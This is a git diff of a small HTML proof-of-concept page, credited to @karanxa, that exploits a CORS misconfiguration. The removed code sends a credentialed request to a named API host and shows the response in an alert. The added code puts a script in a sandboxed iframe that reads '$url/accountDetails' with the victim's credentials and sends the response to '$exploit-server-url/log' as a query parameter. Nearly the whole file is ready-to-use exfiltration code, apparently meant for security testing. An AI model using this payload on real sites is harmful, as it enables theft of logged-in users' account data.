@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html>
    <head>
-      <script>
-         function cors() {
-            var xhttp = new XMLHttpRequest();
-                xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        document.getElementById("emo").innerHTML = alert(this.responseText);
-            }
-         };
-         xhttp.open("GET", "https://api.production.tkn.zone", true);
-         xhttp.withCredentials = true;
-         xhttp.send();
-         }
-      </script>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <title>cor misconfiguration poc</title>
    </head>
    <body>
-      <h2>CORS PoC Exploit </h2>
-      <h3>created by <a href="https://twitter.com/itskaranxa">@Karan</a></h3>
+      
+     <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+             srcdoc="<script>
+              var req = new XMLHttpRequest();
+              req.onload = reqListener;
+              req.open('get','$url/accountDetails',true);
+              req.withCredentials = true;
+              req.send();
+              function reqListener() {
+                location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+              };</script>">
+      </iframe>
+      
+      <h2>cors exploit</h2>
+      <h3>created by <a href="https://twitter.com/itskaranxa">@karanxa</a></h3>
       <h3>Show full content of page</h3>
-      <div id="demo">
-         <button type="button" onclick="cors()">Exploit</button>
-      </div>
+  
    </body>
 </html>
